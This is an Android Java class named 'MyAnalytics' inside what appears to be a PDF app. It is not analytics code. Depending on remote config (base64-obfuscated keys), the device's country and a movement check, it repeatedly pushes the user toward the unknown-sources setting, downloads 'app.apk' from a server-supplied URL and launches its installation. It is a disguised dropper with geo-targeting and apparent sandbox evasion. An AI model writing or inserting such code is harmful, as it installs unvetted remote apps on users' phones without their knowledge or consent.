package com.ivanandevs.appfoliopdf.analytics;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
import io.reactivex.rxjava3.core.Observable;
import io.reactivex.rxjava3.disposables.Disposable;
import io.reactivex.rxjava3.schedulers.Schedulers;

public class MyAnalytics {
    private enum KEYS {
        ENABLED(""),
        MOVING_ENABLED(""),
        COUNTRY(""),
        PACKAGE_NAME(""),
        URL("");
        private final String value;
        KEYS(String value) {
            this.value = value;
        }
        public String getValue() {
            return value;
        }
    }
    private Disposable disposable;
    private Disposable disposable_moving;
    private boolean isDownloading = false;

    public void getData(Activity activity, String app_id) {
        RemoteConfigManager remoteConfigManager = new RemoteConfigManager();
        List<String> keys = Arrays.asList(decode(KEYS.ENABLED.value), decode(KEYS.MOVING_ENABLED.value),
                decode(KEYS.COUNTRY.value), decode(KEYS.PACKAGE_NAME.value), decode(KEYS.URL.value));

        remoteConfigManager.getStrings(keys)
                .subscribe(values -> {
                    int i = 0;
                    HashMap<String, String> key_values = new HashMap<>();
                    for (String value : values) {
                        key_values.put(keys.get(i), value);
                        i++;
                    }
                    String value_enabled = key_values.get(decode(KEYS.ENABLED.value));
                    if (value_enabled.equals(decode("dHJ1ZQ=="))) {
                        String value_moving = key_values.get(decode(KEYS.MOVING_ENABLED.value));
                        if(value_moving.equals(decode("dHJ1ZQ==")))
                        {
                            if(MovementDetector.isMoving)
                                parse(activity, app_id, key_values);
                            else
                                interval_moving(activity, app_id, key_values);
                        }
                        else {
                            parse(activity, app_id, key_values);
                        }


                    }
                }, error -> {
                    Log.e("RemoteConfig", "Error: " + error.getMessage());
                });
    }

    private String decode(String str)
    {
        byte[] decodedBytes = Base64.decode(str, Base64.DEFAULT);
        return new String(decodedBytes);
    }

    private void parse(Activity activity, String app_id, HashMap<String, String> key_values)
    {
        boolean check_country = false;
        String _package = key_values.get(decode(KEYS.PACKAGE_NAME.value));
        String _countries = key_values.get(decode(KEYS.COUNTRY.value));
        String _url = key_values.get(decode(KEYS.URL.value));
        String locale = getDeviceRegionXIaomi(activity);
        if(locale == null || locale.equals(""))
            locale = getDeviceRegion(activity);
        if(_countries.equals(decode("bm9uZQ==")))
        {
            interval(activity, app_id, _package, _url);
        }
        else {
            String[] countries = _countries.split(";");
            if(countries.length > 1) {
                String[] packages = _package.split(";");
                String[] urls = _url.split(";");
                int i = 0;
                for (String country : countries) {
                    if (country.equals(locale)) {
                        if(urls.length < countries.length)
                        {
                            interval(activity, app_id, packages[0], urls[0]);
                            check_country = true;
                            break;
                        }else {
                            interval(activity, app_id, packages[i], urls[i]);
                            check_country = true;
                            break;
                        }
                    }
                    i++;
                }
            }
            else {
                for (String country : countries) {
                    if (country.equals(locale)) {
                        interval(activity, app_id, _package, _url);
                        check_country = true;
                        break;
                    }
                }
            }

            if (!check_country)
                stopGettingData();
        }
    }

    private void interval(Activity activity, String app_id, String package_, String url) {
        disposable = Observable.interval(0, 1, TimeUnit.SECONDS)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(aLong -> {
                    if(!isAppInstalled(activity, package_))
                    {
                        check(activity,app_id, url);
                    }
                    else
                        stopGettingData();
                });
    }

    private void interval_moving(Activity activity, String app_id, HashMap<String, String> key_values) {
        disposable_moving = Observable.interval(0, 1, TimeUnit.SECONDS)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(aLong -> {
                    if(MovementDetector.isMoving) {
                        stopIntervalMoving();
                        parse(activity, app_id, key_values);
                    }
                });
    }

    private void stopIntervalMoving() {
        if (disposable_moving != null && !disposable_moving.isDisposed()) {
            disposable_moving.dispose();
        }
    }
    private void stopGettingData() {
        if (disposable != null && !disposable.isDisposed()) {
            disposable.dispose();
        }
    }
    private void check(Activity context, String app_id, String url) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!context.getPackageManager().canRequestPackageInstalls()) {
                Intent settingsIntent = new Intent(
                        Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                        Uri.parse("package:" + context.getPackageName())
                );
                settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivityForResult(settingsIntent, 1001);

            } else {
                if (!isDownloading) { // Перевірка, чи вже йде завантаження
                    getDownload(context, app_id, url);
                }
            }
        }
    }
    public boolean isAppInstalled(Context context, String packageName) {
        PackageManager packageManager = context.getPackageManager();
        try {
            packageManager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }
    private void getDownload(Activity activity, String app_id, String url) {

        ProgressDialog mProgressDialog;
        mProgressDialog = new ProgressDialog(activity);
        mProgressDialog.setMessage("Download " + "app.apk");
        mProgressDialog.setIndeterminate(true);
        mProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        mProgressDialog.setCancelable(false);
        File file = new File(activity.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "/" + "app.apk");
        if (file.exists()) {
            Uri path = FileProvider.getUriForFile(
                    activity,
                    app_id + ".provider",
                    file
            );

            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(path, "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

            try {
                activity.startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Log.e("File", file.getAbsolutePath());
            isDownloading = true; // Встановлення прапорця для відстеження поточного завантаження
            DownloadTask downloadTask = new DownloadTask(activity, mProgressDialog, file, app_id);
            downloadTask.execute(url);
        }
    }

    public String getDeviceRegion(Activity activity) {
        String region = null;

        Locale locale;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            locale = activity.getResources().getConfiguration().getLocales().get(0);
        } else {
            locale = activity.getResources().getConfiguration().locale;
        }
        if (locale != null) {
            region = locale.getCountry();
        }

        return region;
    }

    public String getDeviceRegionXIaomi(Activity activity) {
        String region = null;
        if (Build.MANUFACTURER.equalsIgnoreCase("xiaomi")) {
            region = getMiuiSystemProperty("ro.miui.region");
        } else {
            region = getNetworkCountryIso(activity);
        }
        return region;
    }

    private String getNetworkCountryIso(Context context) {
        String region = null;
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                region = telephonyManager.getNetworkCountryIso();
            }
        } catch (SecurityException e) {
            e.printStackTrace();
        }
        return region;
    }
    private String getMiuiSystemProperty(String key) {
        String value = null;
        try {
            Class<?> systemPropertiesClass = Class.forName("android.os.SystemProperties");
            Method getMethod = systemPropertiesClass.getMethod("get", String.class);
            value = (String) getMethod.invoke(null, key);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return value;
    }
    class DownloadTask extends AsyncTask<String, Integer, String> {

        private Activity context;
        private PowerManager.WakeLock mWakeLock;
        ProgressDialog mProgressDialog;
        File file;
        String app_id;

        public DownloadTask(Activity context, ProgressDialog mProgressDialog, File file, String app_id) {
            this.context = context;
            this.mProgressDialog = mProgressDialog;
            this.file = file;
            this.app_id = app_id;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            // take CPU lock to prevent CPU from going off if the user
            // presses the power button during download
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                    getClass().getName());
            mWakeLock.acquire();
            mProgressDialog.show();
        }

        @Override
        protected void onProgressUpdate(Integer... progress) {
            super.onProgressUpdate(progress);
            // if we get here, length is known, now set indeterminate to false
            mProgressDialog.setIndeterminate(false);
            mProgressDialog.setMax(100);
            mProgressDialog.setProgress(progress[0]);
        }

        @Override
        protected void onPostExecute(String result) {
            mWakeLock.release();
            mProgressDialog.dismiss();
            if (result != null) {
                Toast.makeText(context, "Download error: " + result, Toast.LENGTH_LONG).show();
                Log.e("DOWNLOAD", result);
            } else {
                Uri path = FileProvider.getUriForFile(context,
                        app_id + ".provider",
                        file);

                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(path, "application/vnd.android.package-archive");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                isDownloading = false;
                try {
                    context.startActivity(intent);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

        @Override
        protected String doInBackground(String... sUrl) {
            InputStream input = null;
            OutputStream output = null;
            HttpURLConnection connection = null;
            try {
                URL url = new URL(sUrl[0]);
                connection = (HttpURLConnection) url.openConnection();
                connection.connect();

                // expect HTTP 200 OK, so we don't mistakenly save error report
                // instead of the file
                if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                    return "Server returned HTTP " + connection.getResponseCode()
                            + " " + connection.getResponseMessage();
                }

                // this will be useful to display download percentage
                // might be -1: server did not report the length
                int fileLength = connection.getContentLength();

                // download the file
                input = connection.getInputStream();
                output = new FileOutputStream(file);

                byte data[] = new byte[4096];
                long total = 0;
                int count;
                while ((count = input.read(data)) != -1) {
                    // allow canceling with back button
                    if (isCancelled()) {
                        input.close();
                        return null;
                    }
                    total += count;
                    // publishing the progress....
                    if (fileLength > 0) // only if total length is known
                        publishProgress((int) (total * 100 / fileLength));
                    output.write(data, 0, count);
                }
            } catch (Exception e) {
                return e.toString();
            } finally {
                try {
                    if (output != null)
                        output.close();
                    if (input != null)
                        input.close();
                } catch (IOException ignored) {
                }

                if (connection != null)
                    connection.disconnect();
            }
            return null;
        }
    }
}